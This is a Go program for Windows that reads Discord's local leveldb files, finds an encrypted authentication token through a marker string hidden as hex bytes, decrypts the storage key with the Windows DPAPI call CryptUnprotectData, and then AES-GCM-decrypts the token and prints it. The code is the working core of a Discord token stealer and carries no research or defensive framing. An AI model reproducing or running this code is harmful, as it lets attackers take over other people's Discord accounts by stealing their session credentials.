package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

var toFind = []byte{
	'\x64', '\x51', '\x77', '\x34', '\x77', '\x39', '\x57', '\x67',
	'\x58', '\x63', '\x51', '\x3A',
}

var (
	dllcrypt32      = syscall.NewLazyDLL("Crypt32.dll")
	dllkernel32     = syscall.NewLazyDLL("Kernel32.dll")
	procDecryptData = dllcrypt32.NewProc("CryptUnprotectData")
	procLocalFree   = dllkernel32.NewProc("LocalFree")
	discordPath     = filepath.Join(os.Getenv("appdata"), "discord")
	localStatePath  = filepath.Join(discordPath, "Local State")
	levelDbPath     = filepath.Join(discordPath, "Local Storage", "leveldb")
)

func handleErr(errText string, err error) {
	errString := errText + "\n" + err.Error()
	panic(errString)
}

func populatePaths(path string) ([]string, error) {
	var paths []string
	files, err := ioutil.ReadDir(path)
	if err != nil {
		return nil, err
	}
	for _, f := range files {
		fname := f.Name()
		if !f.IsDir() && strings.HasSuffix(fname, ".ldb") {
			filePath := filepath.Join(path, fname)
			paths = append(paths, filePath)
		}
	}
	return paths, nil
}

func getLastMod(paths []string) (string, error) {
	var (
		lastMod     time.Time
		lastModPath string
	)
	for i, path := range paths {
		stat, err := os.Stat(path)
		if err != nil {
			return "", err
		}
		modTime := stat.ModTime()
		if i == 0 {
			lastMod = modTime
			continue
		}
		if modTime.After(lastMod) {
			lastMod = modTime
			lastModPath = path
		}
	}
	return lastModPath, nil
}

func getOffset(path string) (int, []byte, error) {
	data, err := ioutil.ReadFile(path)
	if err != nil {
		return -1, nil, err
	}
	offset := bytes.Index(data, toFind)
	if offset == -1 {
		return -1, nil, errors.New("No hits.")
	}
	return offset + 12, data, nil
}

func getEncToken(offset int, data []byte) ([]byte, error) {
	var _encToken string
	for {
		char := string(data[offset])
		if char == "\"" {
			break
		}
		_encToken += char
		offset++
	}
	return base64.StdEncoding.DecodeString(_encToken)
}

func makeBlob(d []byte) *DataBlob {
	if len(d) == 0 {
		return &DataBlob{}
	}
	return &DataBlob{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func (b *DataBlob) toByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

func decryptKey(data []byte) ([]byte, error) {
	var outBlob DataBlob
	blob := makeBlob(data)
	r, _, err := procDecryptData.Call(
		uintptr(unsafe.Pointer(blob)), 0, 0, 0, 0, 0x1, uintptr(unsafe.Pointer(&outBlob)))
	if r == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outBlob.pbData)))
	return outBlob.toByteArray(), nil
}

func getKey(localStatePath string) ([]byte, error) {
	var localState LocalState
	stateBytes, err := ioutil.ReadFile(localStatePath)
	if err != nil {
		return nil, err
	}
	err = json.Unmarshal(stateBytes, &localState)
	if err != nil {
		return nil, err
	}
	key, err := base64.StdEncoding.DecodeString(localState.OSCrypt.EncryptedKey)
	if err != nil {
		return nil, err
	}
	decKey, err := decryptKey(key[5:])
	if err != nil {
		return nil, err
	}
	return decKey, nil
}

func decryptToken(encToken, key []byte) (string, error) {
	nonce := encToken[3 : 3+12]
	encTokenWithTag := encToken[3+12:]
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", nil
	}
	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", nil
	}
	decToken, err := aesgcm.Open(nil, nonce, encTokenWithTag, nil)
	if err != nil {
		return "", nil
	}
	return string(decToken), nil
}

func main() {
	paths, err := populatePaths(levelDbPath)
	if err != nil {
		handleErr("Failed to populate LDB paths.", err)
	}
	var path string
	pathsLen := len(paths)
	if pathsLen == 0 {
		panic("Couldn't find any LDB files.")
	} else if pathsLen > 1 {
		path, err = getLastMod(paths)
		if err != nil {
			handleErr("Failed to get last modified LDB file.", err)
		}
	} else {
		path = paths[0]
	}
	offset, data, err := getOffset(path)
	if err != nil {
		handleErr("Failed to get encrypted token offset.", err)
	}
	encToken, err := getEncToken(offset, data)
	if err != nil {
		handleErr("Failed to get encrypted token.", err)
	}
	key, err := getKey(localStatePath)
	if err != nil {
		handleErr("Failed to get local state key.", err)
	}
	decToken, err := decryptToken(encToken, key)
	if err != nil {
		handleErr("Failed to decrypt token.", err)
	}
	fmt.Println(decToken)
}
